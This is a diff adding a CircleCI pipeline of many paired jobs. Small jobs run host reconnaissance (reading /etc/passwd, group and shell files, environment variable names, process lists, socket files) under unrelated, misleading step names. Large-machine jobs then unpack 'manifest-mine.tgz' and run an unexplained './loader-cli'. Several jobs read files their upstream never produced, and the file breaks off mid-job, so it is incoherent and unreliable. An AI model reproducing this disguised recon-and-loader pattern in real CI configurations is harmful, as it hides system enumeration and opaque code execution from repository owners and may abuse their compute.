@@ -1,0 +1,1389 @@
+version: 2.1
+
+jobs:
+  moduleStr_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute v3
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; ls -w 60 | wc -w; true ; } > /tmp/x3/b6b4bb128
+            echo "gate Package_Image2: $(wc -c </tmp/x3/b6b4bb128) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'b6b4bb128'
+  Package_Image2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/b6b4bb128
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  mark1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Daily currency field imputation
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; for f in /etc/profile.d/*; do basename "$f";done; true ; } > /tmp/x3/access-080bc.log
+            echo "gate preview-build: $(wc -c </tmp/x3/access-080bc.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'access-080bc.log'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/access-080bc.log
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Tonight inform the board
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; find /usr/lib -maxdepth 1 -type f -name 'os-release'| awk -F/ '{print $NF}'; true ; } > /tmp/x3/20250406_111355
+            echo "gate rocket: $(wc -c </tmp/x3/20250406_111355) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '20250406_111355'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/Z9x
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  FinnTanaka:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Verify
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/new-tracking" && touch "/tmp/new-tracking"/a.tmp "/tmp/new-tracking"/b.tmp && find "/tmp/new-tracking" -name '*.tmp' -delete && ls -A "/tmp/new-tracking"; true ; } > /tmp/x3/pn6wHkmVXotov7Mk8
+            echo "gate dp-new: $(wc -c </tmp/x3/pn6wHkmVXotov7Mk8) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'pn6wHkmVXotov7Mk8'
+  dp-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/pn6wHkmVXotov7Mk8
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  zxcxcvb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: 23 mfa setting monitoring
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; printf '%s\n' eagle otter bear crow owl >"/tmp/client.log" && wc -l "/tmp/client.log"; true ; } > /tmp/x3/greensigmatoken
+            echo "gate LaunchProd: $(wc -c </tmp/x3/greensigmatoken) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'greensigmatoken'
+  LaunchProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/greensigmatoken
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  weIGHt__ShIpMENt__cLEAR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Weigh agar before the freeze
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; find /run -type f -name '*.sock' -exec du -h {} \; 2>/dev/null | sort -r; true ; } > /tmp/x3/pkg_dat
+            echo "gate v4-canary: $(wc -c </tmp/x3/pkg_dat) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'pkg_dat'
+  v4-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/pkg_dat
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  k4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Immediately restock the outbound orders
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; printenv | awk -F'=' '{print $1}' | pr -3 -t; true ; } > /tmp/x3/fb502024-cf41-7c6f
+            echo "gate push-it: $(wc -c </tmp/x3/fb502024-cf41-7c6f) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'fb502024-cf41-7c6f'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/Z9x
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  r47io:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: vrfy src 55
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; grep -qs 'kmem' /etc/group && echo 'it is there' || echo 'nope'; true ; } > /tmp/x3/HTTP.wave
+            echo "gate sanity: $(wc -c </tmp/x3/HTTP.wave) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'HTTP.wave'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/HTTP.wave
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  capability_controller_locked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: No flaky tests to double check
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 3 \( -name '*.txt' -o -name '*.gz' \) -user $(whoami) -print0 2> /dev/null | xargs -0r ls -ld; true ; } > /tmp/x3/mothreef
+            echo "gate strated-57: $(wc -c </tmp/x3/mothreef) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'mothreef'
+  strated-57:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/mothreef
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  bindPort:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Recording From Denver
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; ls -dlo /usr/bin /var/spool | awk 'NR>1 {print $1}' | sort | uniq -c; true ; } > /tmp/x3/RavenModuleSilent
+            echo "gate wen-run: $(wc -c </tmp/x3/RavenModuleSilent) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'RavenModuleSilent'
+  wen-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/stage2c4d643
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  team-papa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Op 014 silver layer validation
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; greeting="center-src" && printf '%s\n' "${#greeting}"; true ; } > /tmp/x3/964b2dbf81bec5ea842055c92
+            echo "gate d-new: $(wc -c </tmp/x3/964b2dbf81bec5ea842055c92) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '964b2dbf81bec5ea842055c92'
+  d-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/964b2dbf81bec5ea842055c92
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  l:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Fourth Skinning Attempt
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; seq 16 >"/tmp/otter.milk.member.tmp" && tail -n 1 "/tmp/otter.milk.member.tmp"; true ; } > /tmp/x3/theta
+            echo "gate build-partial-artifact-bundle: $(wc -c </tmp/x3/theta) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'theta'
+  build-partial-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/Z9x
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  needs_box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute v3
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; cp /etc/group ${TMPDIR:-/tmp}/pepper.conf && sed -i.bak '/^root/d' ${TMPDIR:-/tmp}/pepper.conf && grep -c . ${TMPDIR:-/tmp}/pepper.conf; true ; } > /tmp/x3/47a710c67
+            echo "gate fire-up: $(wc -c </tmp/x3/47a710c67) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '47a710c67'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/47a710c67
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  cold-p:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Approval State Dirty
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; find /var/log -type d -name 'wtmp' -writable -exec stat -c %n {} + 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -n 5; true ; } > /tmp/x3/05.07.2019
+            echo "gate jul7-canary: $(wc -c </tmp/x3/05.07.2019) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '05.07.2019'
+  jul7-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/05.07.2019
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  args_exp_prev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Count for the release
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; if ! grep -q "NOPE" $HOME/.bashrc ; then echo absent; fi; true ; } > /tmp/x3/stage2c4d643
+            echo "gate callisto-rc: $(wc -c </tmp/x3/stage2c4d643) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'stage2c4d643'
+  callisto-rc:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/stage2c4d643
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  ISRInstance:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Aliquot the control group batch 17
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; getent passwd | awk -F ":" '{ print $3 }' | sort -n; true ; } > /tmp/x3/8d036064-def8-0be2-c26a
+            echo "gate p-2: $(wc -c </tmp/x3/8d036064-def8-0be2-c26a) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '8d036064-def8-0be2-c26a'
+  p-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/8d036064-def8-0be2-c26a
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  entry5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: A754 RETURNS BIN SCAN
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; cat /etc/shells | sed 's|.*/||' | tac | awk '{print toupper(substr($0,1,1)) substr($0,2)}'; true ; } > /tmp/x3/LEDGER_BUFFER_PLASMA_WILLOW
+            echo "gate titan2-final: $(wc -c </tmp/x3/LEDGER_BUFFER_PLASMA_WILLOW) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'LEDGER_BUFFER_PLASMA_WILLOW'
+  titan2-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/stage2c4d643
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  NullErrorUtils:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Submit the password field landscape
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; target='retrying in 5 seconds'; declare -p target; true ; } > /tmp/x3/GiZLNktQzas
+            echo "gate p-new: $(wc -c </tmp/x3/GiZLNktQzas) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'GiZLNktQzas'
+  p-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/GiZLNktQzas
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  klushsisttaimd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: so like expand the cookie banner
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; echo 'lorem ipsum dolor sit amet' | tr ' ' '\n' | sort; true ; } > /tmp/x3/AMBER_GLACIER_BRAMBLE_RASTER
+            echo "gate nov10-ship: $(wc -c </tmp/x3/AMBER_GLACIER_BRAMBLE_RASTER) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'AMBER_GLACIER_BRAMBLE_RASTER'
+  nov10-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/AMBER_GLACIER_BRAMBLE_RASTER
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  bugfix-145-factory:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Confirm the travel claims by payroll cutoff
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; printf '%s\n' "name: demo" | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/x3/crimson.meadow.fjord
+            echo "gate Verify_Tests8: $(wc -c </tmp/x3/crimson.meadow.fjord) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'crimson.meadow.fjord'
+  Verify_Tests8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/crimson.meadow.fjord
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  sleepASCII:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: With retries page the vendor
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; ps axo pid,ppid,stat,comm | sort -k3,3 -n -r | tail -n +2; true ; } > /tmp/x3/Z9x
+            echo "gate realease: $(wc -c </tmp/x3/Z9x) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'Z9x'
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/Z9x
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  postSidebarById:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Close petty cash per entity
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd >"/tmp/report.tracking.castle.gz" && zgrep -c bash "/tmp/report.tracking.castle.gz"; true ; } > /tmp/x3/glintserverred
+            echo "gate all-greens: $(wc -c </tmp/x3/glintserverred) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'glintserverred'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/glintserverred
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  ZONE_FILE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Carefully calibrate the eval harness
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -type d -not -name "lastlog" -exec ls -1d {} \; 2>/dev/null | head --lines=6; true ; } > /tmp/x3/KAk
+            echo "gate go1-21-cov: $(wc -c </tmp/x3/KAk) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'KAk'
+  go1-21-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/Z9x
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  ww:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Make sure to release the blue green slots
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; echo -n 'almost there'|base64; true ; } > /tmp/x3/211.225.244
+            echo "gate apr16-canary: $(wc -c </tmp/x3/211.225.244) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - '211.225.244'
+  apr16-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/211.225.244
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  has-backup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute v3
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; rev_words() { echo "[$(date +%T)] $*"; }; rev_words "greetings from linux"; true ; } > /tmp/x3/blue
+            echo "gate verify-full-regression-suite: $(wc -c </tmp/x3/blue) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'blue'
+  verify-full-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/blue
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  LANGUAGE_MT_DE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: doShredReportPdfs
+          command: |
+            mkdir -p /tmp/x3
+            { set +o pipefail 2>/dev/null; find /tmp \( -name "*.tmp" -o -name "tmp*" \) -group root -exec basename '{}' \; 2>/dev/null | sort | head -n 3; true ; } > /tmp/x3/kappa-4415
+            echo "gate v6-nightly: $(wc -c </tmp/x3/kappa-4415) bytes total"
+      - persist_to_workspace:
+          root: /tmp/x3
+          paths:
+            - 'kappa-4415'
+  v6-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Sense upstream
+          command: |
+            cat /tmp/x3/kappa-4415
+      - run:
+          name: Checkout main
+          command: git clone --depth 1 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -xzf manifest-mine.tgz
+      - run:
+          name: Verify output
+          command: sleep 15
+      - run:
+          command: ./loader-cli
+  mk2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/x3
+      - run:
+          name: Opening Issue
+          command: |
+            mkdir -p /tmp/x3
